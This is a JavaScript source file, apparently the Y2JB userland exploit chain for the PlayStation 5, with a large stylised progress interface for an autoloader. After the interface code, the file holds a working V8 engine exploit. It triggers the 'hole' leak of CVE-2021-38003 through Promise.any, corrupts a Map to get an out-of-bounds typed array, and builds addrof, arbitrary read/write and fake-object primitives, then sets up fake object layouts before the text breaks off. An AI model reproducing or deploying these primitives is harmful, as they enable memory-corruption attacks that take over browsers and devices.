/*
    Copyright (C) 2025 Gezine
    
    This software may be modified and distributed under the terms
    of the MIT license.  See the LICENSE file for details.
*/

const version_string = "Y2JB 1.3 by Gezine";

const autoloader_version = "v0.5";



async function load_localscript(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

(async function() {
    await load_localscript('global.js');
})();

let NETWORK_LOGGING = false;
// Use setlogserver.js payload to change server url at runtime
let LOG_SERVER = '';

async function checkLogServer() {
    NETWORK_LOGGING = false;
}

const baseWidth = 1920;
const baseHeight = 1080;
const scale = window.innerWidth / baseWidth;

let outputElement = null;
// hack for scrolling messages
let maxLines = 56;
const fontSize = Math.floor((baseHeight / maxLines * 0.85) * scale);
const leftPadding = Math.floor((baseWidth * 0.005) * scale);
const topPadding = Math.floor((baseHeight * 0.005) * scale);

async function log(msg) {
    let message = String(msg);
    if (!outputElement) {
        outputElement = document.getElementById('output');
        if (!outputElement) {
            outputElement = document.createElement('div');
            outputElement.id = 'output';
            document.body.appendChild(outputElement);
        }
        outputElement.style.paddingLeft = leftPadding + 'px';
        outputElement.style.paddingTop = topPadding + 'px'; 
    }
    
    const lines = message.split('\n');
    lines.forEach(line => {
        let lineDiv = document.createElement('div');
        lineDiv.textContent = line === '' ? '\u00A0' : line;
        lineDiv.style.fontSize = fontSize + 'px';
        lineDiv.className = "boot-log-line";
        
        outputElement.appendChild(lineDiv);
    });
    
    while (outputElement.children.length > maxLines) {
        outputElement.removeChild(outputElement.children[0]);
    }
    
    await new Promise(resolve => {
        requestAnimationFrame(() => {
            setTimeout(resolve, 1);
        });
    });
        
    if (NETWORK_LOGGING) {
        try {
            await fetch(LOG_SERVER, {
                method: 'POST',
                body: message,
            });
        } catch (e) { }
    }
}

function toHex(num) {
    return '0x' + BigInt(num).toString(16).padStart(16, '0');
}

function trigger() {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

(async function() {
    const original_log = window.log || log;
    window.log = async function(msg) {
        if (typeof msg === 'string' && (msg.includes("[ERROR]") || msg.includes("[-]"))) {
            if (typeof window.hideUI === 'function') window.hideUI();
        }
        if (typeof original_log === 'function') {
            return await original_log(msg);
        }
    };

    window.setSystemStatus = function(message, type="info") {
        const status = document.getElementById("systemStatus");
        if (!status || typeof message !== "string") {
            return;
        }

        const normalized = message
            .replace(/^\[[^\]]+\]\s*/, "")
            .replace(/\.+$/, "")
            .trim()
            .toUpperCase();

        if (!normalized) {
            return;
        }

        const typeClass = {
            error: "cyber-text-glow--magenta",
            success: "cyber-text-glow--green",
            warning: "cyber-text-glow--yellow",
            info: "cyber-text-glow"
        }[type] || "cyber-text-glow";

        const typeColor = {
            error: "#ff2a6d",
            success: "#05ffa1",
            warning: "#fcee0a",
            info: "#00f0ff"
        }[type] || "#00f0ff";

        status.className = "cyber-glitch host-effects-title " + typeClass;
        status.style.color = typeColor;
        status.style.textShadow = "0 0 13px " + typeColor + ", 2px 0 0 rgba(255,42,109,0.65), -2px 0 0 rgba(5,255,161,0.45)";
        status.dataset.text = normalized;
        status.textContent = normalized;
    };

    function isStageStatus(message, type) {
        if (type === "warning" || type === "error") {
            return true;
        }

        if (typeof message !== "string") {
            return false;
        }

        return /running|chain|primitive|kernel|autoload|payload|finished|ready/i.test(message);
    }

    function applyStyles(element, styles) {
        for (const key in styles) {
            if (Object.prototype.hasOwnProperty.call(styles, key)) {
                element.style[key] = styles[key];
            }
        }
    }

    function setKernelVisualMode(enabled) {
        const ui = document.getElementById("autoloader_ui");
        if (!ui) {
            return;
        }

        if (enabled) {
            if (ui.className.indexOf("host-kernel-mode") === -1) {
                ui.className += " host-kernel-mode";
            }
        } else {
            ui.className = ui.className.replace(/\s*host-kernel-mode/g, "");
        }

        const criticalIds = [
            "systemStatus",
            "moduleGrid",
            "moduleValue0",
            "moduleValue1",
            "moduleValue2",
            "moduleFill0",
            "moduleFill1",
            "moduleFill2"
        ];

        for (let i = 0; i < criticalIds.length; i++) {
            const element = document.getElementById(criticalIds[i]);
            if (element) {
                element.style.visibility = "visible";
                element.style.opacity = "1";
            }
        }
    }

    window.autoloader_ui = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }

        const baseWidth = 1920;
        const baseHeight = 1080;
        const scale = Math.min(window.innerWidth / baseWidth, window.innerHeight / baseHeight);

        const autoloader_ui = document.createElement("div");
        autoloader_ui.id = "autoloader_ui";
        autoloader_ui.className = "xmb-shell";
        applyStyles(autoloader_ui, {
            position: "fixed",
            top: "0px",
            left: "0px",
            width: baseWidth + "px",
            height: baseHeight + "px",
            transform: "scale(" + scale + ")",
            transformOrigin: "top left",
            zIndex: "9999",
            overflow: "hidden",
            backgroundColor: "#060810",
            backgroundImage: "radial-gradient(ellipse at 50% 100%, rgba(252,238,10,0.07) 0%, transparent 55%), radial-gradient(ellipse at 20% 60%, rgba(255,42,109,0.06) 0%, transparent 35%), radial-gradient(ellipse at 80% 60%, rgba(0,240,255,0.05) 0%, transparent 35%)",
            color: "#fcee0a",
            fontFamily: "'Courier New', Consolas, monospace"
        });

        const waveOne = document.createElement("div");
        waveOne.className = "xmb-wave xmb-wave--one";
        autoloader_ui.appendChild(waveOne);

        const waveTwo = document.createElement("div");
        waveTwo.className = "xmb-wave xmb-wave--two";
        autoloader_ui.appendChild(waveTwo);

        const topBar = document.createElement("div");
        topBar.className = "xmb-topbar";
        applyStyles(topBar, {
            position: "absolute",
            top: "18px",
            left: "56px",
            width: "1808px",
            height: "70px",
            color: "#fff",
            fontSize: "24px",
            lineHeight: "70px",
            textShadow: "0 2px 8px rgba(0,0,0,0.55)"
        });
        autoloader_ui.appendChild(topBar);

        const brand = document.createElement("div");
        brand.textContent = autoloader_version;
        applyStyles(brand, {
            position: "absolute",
            top: "0px",
            left: "0px",
            width: "142px",
            height: "70px",
            color: "#fcee0a",
            fontSize: "34px",
            fontWeight: "700",
            letterSpacing: "2px",
            textShadow: "0 0 14px rgba(252,238,10,0.7)"
        });
        topBar.appendChild(brand);

        const credit = document.createElement("div");
        credit.textContent = "StonedModder";
        applyStyles(credit, {
            position: "absolute",
            top: "0px",
            left: "156px",
            width: "360px",
            height: "70px",
            color: "rgba(252,238,10,0.65)",
            fontSize: "22px",
            letterSpacing: "1px"
        });
        topBar.appendChild(credit);

        const sonicBadge = document.createElement("div");
        sonicBadge.textContent = "Sonic Loader 1.0.21";
        applyStyles(sonicBadge, {
            position: "absolute",
            top: "14px",
            left: "530px",
            height: "42px",
            padding: "0 18px",
            color: "#fcee0a",
            backgroundColor: "rgba(252,238,10,0.08)",
            border: "1px solid rgba(252,238,10,0.40)",
            fontSize: "18px",
            fontWeight: "700",
            letterSpacing: "3px",
            lineHeight: "42px",
            textTransform: "uppercase",
            textShadow: "0 0 10px rgba(252,238,10,0.6)",
            boxShadow: "0 0 12px rgba(252,238,10,0.20)"
        });
        topBar.appendChild(sonicBadge);

        const version = document.createElement("div");
        version.textContent = "OFFLINE";
        applyStyles(version, {
            position: "absolute",
            top: "0px",
            right: "186px",
            width: "120px",
            height: "70px",
            color: "#00f0ff",
            textAlign: "right",
            fontSize: "22px",
            letterSpacing: "2px",
            textShadow: "0 0 10px rgba(0,240,255,0.6)"
        });
        topBar.appendChild(version);

        const clock = document.createElement("div");
        clock.textContent = "Y2JB";
        applyStyles(clock, {
            position: "absolute",
            top: "0px",
            right: "0px",
            width: "170px",
            height: "70px",
            color: "#fcee0a",
            textAlign: "right",
            fontSize: "22px",
            fontWeight: "700",
            letterSpacing: "3px",
            textShadow: "0 0 14px rgba(252,238,10,0.7)"
        });
        topBar.appendChild(clock);

        const status = document.createElement("div");
        status.id = "systemStatus";
        status.textContent = "STANDING BY";
        status.dataset.text = "STANDING BY";
        status.className = "xmb-status";
        applyStyles(status, {
            position: "absolute",
            top: "104px",
            left: "76px",
            width: "1768px",
            height: "48px",
            color: "#fcee0a",
            fontSize: "26px",
            lineHeight: "48px",
            overflow: "hidden",
            whiteSpace: "nowrap",
            textOverflow: "ellipsis",
            fontWeight: "700",
            letterSpacing: "6px",
            textShadow: "0 0 16px rgba(252,238,10,0.7), 0 0 40px rgba(252,238,10,0.3)"
        });
        autoloader_ui.appendChild(status);

        const moduleGrid = document.createElement("div");
        moduleGrid.id = "moduleGrid";
        moduleGrid.className = "xmb-ribbon";
        applyStyles(moduleGrid, {
            position: "absolute",
            top: "190px",
            left: "80px",
            width: "1760px",
            height: "246px",
            overflow: "hidden"
        });
        autoloader_ui.appendChild(moduleGrid);

        // Pipeline stages — animations via host-ui.css classes (no style injection)
        var stageLabels  = ["USERLAND",  "KERNEL",          "PAYLOAD",    "AUTOLOAD",     "COMPLETE"  ];
        var stageSubs    = ["EXPLOIT INIT","PRIV ESCALATION","ELF LOADER", "MANIFEST EXEC","SYSTEM READY"];
        var stageBoxes   = [];
        var stageDots    = [];
        var stageLbls    = [];
        var stageSts     = [];
        var stageArrows  = [];

        var SW = 238, AW = 110, SH = 170;
        var pipeW = stageLabels.length * SW + (stageLabels.length - 1) * AW;
        var pipeX = Math.floor((1760 - pipeW) / 2);
        var pipeY = Math.floor((246 - SH) / 2);

        for (var si = 0; si < stageLabels.length; si++) {
            var sx = pipeX + si * (SW + AW);

            var sbox = document.createElement("div");
            applyStyles(sbox, {
                position: "absolute",
                top: pipeY + "px",
                left: sx + "px",
                width: SW + "px",
                height: SH + "px",
                border: "1px solid rgba(252,238,10,0.15)",
                backgroundColor: "rgba(6,8,16,0.92)",
                boxSizing: "border-box",
                overflow: "hidden"
            });

            var snum = document.createElement("div");
            applyStyles(snum, {
                position: "absolute",
                top: "12px",
                left: "14px",
                color: "rgba(252,238,10,0.28)",
                fontSize: "11px",
                fontWeight: "700",
                letterSpacing: "1px"
            });
            snum.textContent = "0" + (si + 1);
            sbox.appendChild(snum);

            var sdot = document.createElement("div");
            applyStyles(sdot, {
                position: "absolute",
                top: "17px",
                right: "14px",
                width: "9px",
                height: "9px",
                borderRadius: "50%",
                backgroundColor: "rgba(252,238,10,0.12)"
            });
            sbox.appendChild(sdot);

            var slbl = document.createElement("div");
            applyStyles(slbl, {
                position: "absolute",
                top: "52px",
                left: "0",
                width: SW + "px",
                textAlign: "center",
                fontSize: "19px",
                fontWeight: "700",
                letterSpacing: "5px",
                color: "rgba(252,238,10,0.22)",
                textTransform: "uppercase"
            });
            slbl.textContent = stageLabels[si];
            sbox.appendChild(slbl);

            var ssub = document.createElement("div");
            applyStyles(ssub, {
                position: "absolute",
                top: "84px",
                left: "0",
                width: SW + "px",
                textAlign: "center",
                fontSize: "10px",
                letterSpacing: "3px",
                color: "rgba(252,238,10,0.14)",
                textTransform: "uppercase"
            });
            ssub.textContent = stageSubs[si];
            sbox.appendChild(ssub);

            var sst = document.createElement("div");
            applyStyles(sst, {
                position: "absolute",
                bottom: "12px",
                left: "0",
                width: SW + "px",
                textAlign: "center",
                fontSize: "10px",
                letterSpacing: "3px",
                color: "rgba(252,238,10,0.16)",
                textTransform: "uppercase"
            });
            sst.textContent = "PENDING";
            sbox.appendChild(sst);

            moduleGrid.appendChild(sbox);
            stageBoxes.push(sbox);
            stageDots.push(sdot);
            stageLbls.push(slbl);
            stageSts.push(sst);

            if (si < stageLabels.length - 1) {
                var sarr = document.createElement("div");
                applyStyles(sarr, {
                    position: "absolute",
                    top: (pipeY + Math.floor(SH / 2) - 16) + "px",
                    left: (sx + SW) + "px",
                    width: AW + "px",
                    height: "32px",
                    textAlign: "center",
                    lineHeight: "32px",
                    color: "rgba(252,238,10,0.15)",
                    fontSize: "22px",
                    letterSpacing: "-4px",
                    userSelect: "none",
                    pointerEvents: "none"
                });
                sarr.textContent = "▶▶▶";
                moduleGrid.appendChild(sarr);
                stageArrows.push(sarr);
            }
        }

        window.setActiveStage = function(activeIndex) {
            for (var i = 0; i < stageBoxes.length; i++) {
                var b  = stageBoxes[i];
                var d  = stageDots[i];
                var l  = stageLbls[i];
                var st = stageSts[i];
                if (i < activeIndex) {
                    b.className = "";
                    b.style.border = "1px solid rgba(0,240,255,0.38)";
                    b.style.boxShadow = "0 0 10px rgba(0,240,255,0.12)";
                    l.style.color = "rgba(0,240,255,0.70)";
                    d.style.backgroundColor = "#00f0ff";
                    d.style.boxShadow = "0 0 8px rgba(0,240,255,0.8)";
                    d.className = "";
                    st.style.color = "rgba(0,240,255,0.55)";
                    st.textContent = "✓ DONE";
                } else if (i === activeIndex) {
                    b.className = "nc-stage-active";
                    b.style.border = "1px solid #fcee0a";
                    b.style.boxShadow = "";
                    l.style.color = "#fcee0a";
                    d.style.backgroundColor = "#fcee0a";
                    d.style.boxShadow = "0 0 10px rgba(252,238,10,0.9)";
                    d.className = "nc-dot-live";
                    st.style.color = "rgba(252,238,10,0.80)";
                    st.textContent = "RUNNING...";
                } else {
                    b.className = "";
                    b.style.border = "1px solid rgba(252,238,10,0.12)";
                    b.style.boxShadow = "";
                    l.style.color = "rgba(252,238,10,0.20)";
                    d.style.backgroundColor = "rgba(252,238,10,0.10)";
                    d.style.boxShadow = "";
                    d.className = "";
                    st.style.color = "rgba(252,238,10,0.14)";
                    st.textContent = "PENDING";
                }
                if (i < stageArrows.length) {
                    if (i < activeIndex) {
                        stageArrows[i].className = "";
                        stageArrows[i].style.color = "rgba(0,240,255,0.45)";
                    } else if (i === activeIndex) {
                        stageArrows[i].className = "nc-arrow-live";
                        stageArrows[i].style.color = "rgba(252,238,10,0.75)";
                    } else {
                        stageArrows[i].className = "";
                        stageArrows[i].style.color = "rgba(252,238,10,0.12)";
                    }
                }
            }
        };

        window.setActiveStage(0);

        const detailTitle = document.createElement("div");
        detailTitle.textContent = "Y2JB // SONIC-ISO PROTOCOL";
        applyStyles(detailTitle, {
            position: "absolute",
            top: "448px",
            left: "92px",
            width: "820px",
            height: "54px",
            fontSize: "30px",
            lineHeight: "54px",
            fontWeight: "700",
            letterSpacing: "4px",
            color: "#fcee0a",
            textTransform: "uppercase",
            textShadow: "0 0 18px rgba(252,238,10,0.65), 0 0 40px rgba(252,238,10,0.25)"
        });
        autoloader_ui.appendChild(detailTitle);

        const detailText = document.createElement("div");
        detailText.textContent = "Y2JB Autoloader v0.5 by PLK // Offline PS5 Exploit Chain";
        applyStyles(detailText, {
            position: "absolute",
            top: "506px",
            left: "94px",
            width: "820px",
            height: "34px",
            fontSize: "16px",
            lineHeight: "34px",
            letterSpacing: "2px",
            color: "rgba(252,238,10,0.50)",
            textShadow: "none"
        });
        autoloader_ui.appendChild(detailText);

        const modules = [
            ["EXPLOIT CHAIN", "INITIALIZING", "#fcee0a"],
            ["KERNEL STAGE", "STANDING BY", "#ff2a6d"],
            ["PAYLOAD RUNNER", "QUEUE READY", "#00f0ff"]
        ];

        modules.forEach((moduleInfo, index) => {
            const card = document.createElement("div");
            applyStyles(card, {
                position: "absolute",
                top: (570 + index * 86) + "px",
                left: "94px",
                width: "760px",
                height: "66px",
                backgroundColor: "rgba(6,8,16,0.92)",
                border: "1px solid rgba(252,238,10,0.18)",
                borderLeft: "3px solid #fcee0a",
                boxShadow: "0 0 16px rgba(252,238,10,0.06)",
                overflow: "hidden"
            });
            autoloader_ui.appendChild(card);

            const moduleLabel = document.createElement("div");
            moduleLabel.textContent = moduleInfo[0];
            applyStyles(moduleLabel, {
                position: "absolute",
                top: "8px",
                left: "18px",
                width: "230px",
                height: "22px",
                color: "rgba(252,238,10,0.50)",
                fontSize: "11px",
                lineHeight: "22px",
                letterSpacing: "3px",
                textTransform: "uppercase"
            });
            card.appendChild(moduleLabel);

            const moduleValue = document.createElement("div");
            moduleValue.id = "moduleValue" + index;
            moduleValue.textContent = moduleInfo[1];
            applyStyles(moduleValue, {
                position: "absolute",
                top: "30px",
                left: "18px",
                width: "420px",
                height: "26px",
                color: "#fcee0a",
                fontSize: "14px",
                fontWeight: "700",
                letterSpacing: "2px",
                lineHeight: "26px",
                overflow: "hidden",
                whiteSpace: "nowrap",
                textOverflow: "ellipsis",
                textShadow: "0 0 8px rgba(252,238,10,0.5)"
            });
            card.appendChild(moduleValue);

            const moduleMeter = document.createElement("div");
            applyStyles(moduleMeter, {
                position: "absolute",
                top: "28px",
                right: "18px",
                width: "230px",
                height: "10px",
                backgroundColor: "rgba(255,255,255,0.04)",
                overflow: "hidden"
            });
            card.appendChild(moduleMeter);

            const moduleFill = document.createElement("div");
            moduleFill.id = "moduleFill" + index;
            applyStyles(moduleFill, {
                width: index === 0 ? "12%" : (index === 1 ? "8%" : "24%"),
                height: "100%",
                backgroundColor: moduleInfo[2],
                boxShadow: "0 0 8px " + moduleInfo[2]
            });
            moduleMeter.appendChild(moduleFill);
        });

        const logWrapper = document.createElement("div");
        logWrapper.id = "logWrapper";
        logWrapper.className = "xmb-log";
        applyStyles(logWrapper, {
            position: "absolute",
            top: "448px",
            left: "940px",
            width: "860px",
            height: "410px",
            backgroundColor: "rgba(6,8,16,0.96)",
            border: "1px solid rgba(252,238,10,0.18)",
            borderLeft: "3px solid #fcee0a",
            boxShadow: "0 0 20px rgba(252,238,10,0.07)",
            overflow: "hidden"
        });
        autoloader_ui.appendChild(logWrapper);

        const logHeader = document.createElement("div");
        logHeader.textContent = "// EVENT STREAM";
        applyStyles(logHeader, {
            position: "absolute",
            top: "0px",
            left: "0px",
            width: "860px",
            height: "48px",
            paddingLeft: "20px",
            boxSizing: "border-box",
            color: "#fcee0a",
            backgroundColor: "rgba(252,238,10,0.07)",
            fontSize: "16px",
            fontWeight: "700",
            letterSpacing: "4px",
            lineHeight: "48px",
            textTransform: "uppercase",
            textShadow: "0 0 10px rgba(252,238,10,0.5)"
        });
        logWrapper.appendChild(logHeader);

        const logContainer = document.createElement("div");
        logContainer.id = "logContainer";
        applyStyles(logContainer, {
            position: "absolute",
            top: "49px",
            left: "0px",
            width: "860px",
            height: "361px",
            padding: "14px 18px",
            boxSizing: "border-box",
            color: "rgba(252,238,10,0.75)",
            overflowX: "hidden",
            overflowY: "scroll",
            fontFamily: "Lucida Console, Consolas, Courier New, monospace",
            fontSize: "18px",
            lineHeight: "28px"
        });
        logWrapper.appendChild(logContainer);

        const progressBarContainer = document.createElement("div");
        progressBarContainer.id = "progressBarContainer";
        applyStyles(progressBarContainer, {
            position: "absolute",
            top: "902px",
            left: "94px",
            width: "1706px",
            height: "64px",
            backgroundColor: "rgba(6,8,16,0.92)",
            border: "1px solid rgba(252,238,10,0.22)",
            borderTop: "2px solid #fcee0a",
            overflow: "hidden",
            boxShadow: "0 0 20px rgba(252,238,10,0.10)"
        });
        autoloader_ui.appendChild(progressBarContainer);

        const progressBar = document.createElement("div");
        progressBar.id = "progressBar";
        applyStyles(progressBar, {
            position: "absolute",
            top: "0px",
            left: "0px",
            width: "100%",
            height: "100%",
            backgroundColor: "#fcee0a",
            boxShadow: "0 0 18px rgba(252,238,10,0.6)",
            transformOrigin: "left",
            transform: "scaleX(0)",
            transition: "transform 0.35s ease-in-out"
        });
        progressBarContainer.appendChild(progressBar);

        const progressLabel = document.createElement("div");
        progressLabel.id = "progressLabel";
        progressLabel.textContent = "Loading...";
        applyStyles(progressLabel, {
            position: "absolute",
            top: "0px",
            left: "0px",
            width: "1706px",
            height: "64px",
            color: "rgba(252,238,10,0.85)",
            fontSize: "18px",
            fontWeight: "700",
            letterSpacing: "3px",
            lineHeight: "64px",
            textAlign: "center",
            textTransform: "uppercase",
            textShadow: "0 0 10px rgba(252,238,10,0.4)",
            overflow: "hidden",
            whiteSpace: "nowrap",
            textOverflow: "ellipsis"
        });
        progressBarContainer.appendChild(progressLabel);

        document.body.appendChild(autoloader_ui);
    };

    window.updateProgress = function(percent, message="Loading...") {
        setKernelVisualMode(percent >= 20 && percent < 50);
        if (typeof window.setActiveStage === 'function') {
            window.setActiveStage(percent < 20 ? 0 : percent < 40 ? 1 : percent < 60 ? 2 : percent < 85 ? 3 : 4);
        }

        const progressBarContainer = document.getElementById("progressBarContainer");
        if (progressBarContainer) {
            progressBarContainer.style.setProperty('--progress-value', percent + '%');
        }
        const progressBar = document.getElementById("progressBar");
        if (progressBar) {
            progressBar.style.width = '100%';
            progressBar.style.transform = 'scaleX(' + (percent / 100) + ')';
        }
        const progressLabel = document.getElementById("progressLabel");
        if (progressLabel) {
            progressLabel.textContent = message;
        }
        window.setSystemStatus(message, "warning");
        window.uiLog(message, "warning");

        const moduleValue0 = document.getElementById("moduleValue0");
        const moduleFill0 = document.getElementById("moduleFill0");
        const moduleValue1 = document.getElementById("moduleValue1");
        const moduleFill1 = document.getElementById("moduleFill1");
        const moduleValue2 = document.getElementById("moduleValue2");
        const moduleFill2 = document.getElementById("moduleFill2");
        if (moduleValue0) {
            moduleValue0.textContent = message;
        }
        if (moduleFill0) {
            moduleFill0.style.width = Math.min(100, Math.max(12, percent * 3)) + "%";
        }
        if (moduleValue1 && percent >= 20) {
            moduleValue1.textContent = message;
        }
        if (moduleFill1) {
            moduleFill1.style.width = Math.min(100, Math.max(8, (percent - 20) * 3)) + "%";
        }
        if (moduleValue2 && percent >= 50) {
            moduleValue2.textContent = message;
        }
        if (moduleFill2) {
            moduleFill2.style.width = Math.min(100, Math.max(24, (percent - 50) * 2)) + "%";
        }
    };

    window.uiLog = function(message, type="info") {
        if (typeof message === 'string' && (message.includes("[ERROR]") || message.includes("[-]"))) {
            if (typeof window.hideUI === 'function') window.hideUI();
        }
        const logContainer = document.getElementById("logContainer");
        if (logContainer) {
            const logEntry = document.createElement("div");
            const typeClass = {
                error: "cyber-text-magenta",
                success: "cyber-text-green",
                warning: "cyber-text-yellow",
                info: "cyber-text-secondary"
            }[type] || "cyber-text-secondary";
            logEntry.className = "host-log-entry " + typeClass;
            logEntry.textContent = message;
            applyStyles(logEntry, {
                width: "806px",
                height: "30px",
                overflow: "hidden",
                whiteSpace: "nowrap",
                textOverflow: "ellipsis",
                fontSize: "22px",
                lineHeight: "30px",
                color: type === "error" ? "#ff2a6d" : (type === "success" ? "#fcee0a" : (type === "warning" ? "#00f0ff" : "rgba(252,238,10,0.60)")),
                textShadow: type === "error" ? "0 0 8px rgba(255,42,109,0.5)" : (type === "success" ? "0 0 8px rgba(252,238,10,0.5)" : "none")
            });
            logContainer.appendChild(logEntry);
            if (isStageStatus(message, type)) {
                window.setSystemStatus(message, type);
            }
            if (logContainer.childElementCount > 20) {
                logContainer.removeChild(logContainer.firstChild);
            }
            const logWrapper = document.getElementById("logWrapper");
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    };

    window.hideUI = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }
    };

    try {
        if (typeof window.autoloader_ui === 'function') {
            window.autoloader_ui();
            window.uiLog("Autoloader " + autoloader_version + " by PLK", "success");
            window.updateProgress(0, "Running userland exploit...");
            window.uiLog("Y2JB by Gezine", "success");

        }
        await log(version_string);
        await log('Starting Exploit');
        
        await gc();
        await gc();
        await gc();
        await gc();
        
        // CVE-2021-38003
        // CVE-2022-4174 faster hole leak
        // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
        let hole = trigger();
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(10, "Chain initialized...");
        }
        
        for (let i = 0; i < 0x10; i++) {
            map1 = new Map();
            map1.set(1, 1);
            map1.set(hole, 1);
            map1.delete(hole);
            map1.delete(hole);
            map1.delete(1);
            oob_arr = new BigUint64Array([0x4141414141414141n]);
        }
        
        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
        obj_arr = [{}, {}];

        map1.set(0x1e, -1);
        gc();
        map1.set(0x0, 0x1);
        
        //oob_arr[31] : 0x2 -- victim_arr length
        //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
        //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
        
        await log ("oob_arr length : " + toHex(oob_arr.length));
        
        const oob_arr_before = [];
        for (let i = 0; i < 100; i++) {
            oob_arr_before[i] = oob_arr[i];
        }
        
        obj_arr[0] = 0x1n;

        let obj_arr_offset = -1;
        for (let i = 0; i < 100; i++) {
            if (oob_arr[i] !== oob_arr_before[i]) {
                obj_arr_offset = i;
                break;
            }
        }

        //await log('obj_arr_offset : ' + obj_arr_offset);
        
        if (obj_arr_offset === -1) {
            throw new Error("Failed to get unstable primitive");
        }
        
        await log("Unstable primitive achieved");
        if (typeof window.uiLog === 'function') {
            window.uiLog("Unstable primitive achieved", "success");
        }
        
        function addrof_unstable(obj) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            obj_arr[0] = obj;
            const addr = oob_arr[obj_arr_offset] - 1n;
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return addr;
        }
        
        function read64_unstable(addr) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            const value = victim_arr[0];
            oob_arr[33] = victim_arr_org_base;
            return value;
        }
        
        function write64_unstable(addr, value) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            victim_arr[0] = value;
            oob_arr[33] = victim_arr_org_base;
        }
        
        function create_fakeobj_unstable(addr) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            oob_arr[obj_arr_offset] = addr + 1n;
            const fake_obj = obj_arr[0];
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return fake_obj;
        }                
        
        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
                        
        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read64_unstable(double_template_addr + 0x10n) - 1n;
        const fixed_double_array_map = read64_unstable(double_elements_addr + 0x00n);
        
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
        
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        // Get templates for large external storage arrays
        const template_biguint = new BigUint64Array(64);
        const template_biguint_addr = addrof_unstable(template_biguint);
        const template_biguint_elements = read64_unstable(template_biguint_addr + 0x10n) - 1n;
        
        const biguint_map = read64_unstable(template_biguint_addr + 0x00n);
        const biguint_props = read64_unstable(template_biguint_addr + 0x08n);
        const biguint_elem_map = read64_unstable(template_biguint_elements + 0x00n);
        const biguint_elem_len = read64_unstable(template_biguint_elements + 0x08n);
        
        // Get template for small inline storage arrays
        const template_small = new BigUint64Array(8);
        const template_small_addr = addrof_unstable(template_small);
        const template_small_buffer_addr = read64_unstable(template_small_addr + 0x18n) - 1n;
        const template_small_elements_addr = read64_unstable(template_small_addr + 0x10n) - 1n;
        
        const small_map = read64_unstable(template_small_addr + 0x00n);
        const small_props = read64_unstable(template_small_addr + 0x08n);
        const small_elem_map = read64_unstable(template_small_elements_addr + 0x00n);
        const small_elem_length_field = read64_unstable(template_small_elements_addr + 0x08n);
        
        const small_buffer_map = read64_unstable(template_small_buffer_addr + 0x00n);
        const small_buffer_props = read64_unstable(template_small_buffer_addr + 0x08n);
        const small_buffer_elements = read64_unstable(template_small_buffer_addr + 0x10n);
        const small_buffer_bit_field = read64_unstable(template_small_buffer_addr + 0x30n);
        
        // Get template for ArrayBuffer
        const template_buffer = new ArrayBuffer(1024);
        const template_buffer_addr = addrof_unstable(template_buffer);
        const template_buffer_elements = read64_unstable(template_buffer_addr + 0x10n) - 1n;
        
        const buffer_map = read64_unstable(template_buffer_addr + 0x00n);
        const buffer_props = read64_unstable(template_buffer_addr + 0x08n);
        const buffer_elem_map = read64_unstable(template_buffer_elements + 0x00n);
        const buffer_elem_len = read64_unstable(template_buffer_elements + 0x08n);
        
        // Get template for Array object
        const template_array = [{}, {}];
        const template_array_addr = addrof_unstable(template_array);
        const template_array_elements_addr = read64_unstable(template_array_addr + 0x10n) - 1n;
        
        const array_map = read64_unstable(template_array_addr + 0x00n);
        const array_props = read64_unstable(template_array_addr + 0x08n);
        const array_elem_map = read64_unstable(template_array_elements_addr + 0x00n);
        
        // Get template for double object
        const heap_number = 1.1;
        const heap_number_addr = addrof_unstable(heap_number);
        const heap_number_map = read64_unstable(heap_number_addr);
        
        const base = stable_elements_addr + 0x2000n;
        
        // Main data region that fake_rw will read/write
        const fake_rw_data = base + 0x0000n;
        
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_array_elements_data = fake_rw_data + 0x0000n;
        // Structure: +0x00: map, +0x08: length, +0x10: slot[0], +0x18: slot[1], ...
        
        const fake_arr2_obj = base + 0x0100n;
        const fake_arr2_elements = base + 0x0150n;
        const fake_rw2_data = base + 0x0200n;
        
        // +0x00: ArrayBuffer (0x38 bytes)
        // +0x48: Elements FixedArray (0x10 bytes header)
        // +0x58: Data (64 bytes for 8 uint64s)
        // +0x98: BigUint64Array object (0x48 bytes)
        
        const fake_bc_base = base + 0x0400n;
        const fake_bc_buffer = fake_bc_base + 0x00n;
        const fake_bc_elements = fake_bc_base + 0x48n;
        const fake_bc_data = fake_bc_base + 0x58n;
        const fake_bc_obj = fake_bc_base + 0x98n;
        
        const fake_frame_base = base + 0x0600n;
        const fake_frame_buffer = fake_frame_base + 0x00n;
        const fake_frame_elements = fake_frame_base + 0x48n;
